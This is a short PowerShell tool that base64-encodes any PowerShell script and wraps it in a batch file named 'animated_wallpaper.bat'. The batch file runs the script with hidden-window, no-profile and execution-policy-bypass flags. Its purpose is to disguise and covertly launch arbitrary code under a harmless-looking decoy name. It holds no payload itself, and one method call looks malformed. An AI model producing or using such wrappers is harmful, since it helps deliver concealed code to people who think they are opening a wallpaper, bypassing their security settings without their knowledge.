$powershell_file_path = "YOUR_FILE_PATH"
$output_path = "$home\Desktop" #YOUR OUTPUT FILE PATH

function P2B {
    param
    (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string]
        $Path
    )
 
    process
    {
        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content -Path $Path -Raw -Encoding UTF8)))
        $newPath = [Io.Path]::ChangeExtension(($output_path + "\animated_wallpaper.bat"))
        "powershell -w h -NoP -NonI -Exec Bypass -WindowStyle Hidden -enc $encoded" | Set-Content -Path $newPath -Encoding Ascii
    }
}

$powershell_file_path | P2B

#######   This program was made by @I-Am-Jakoby :)   #######
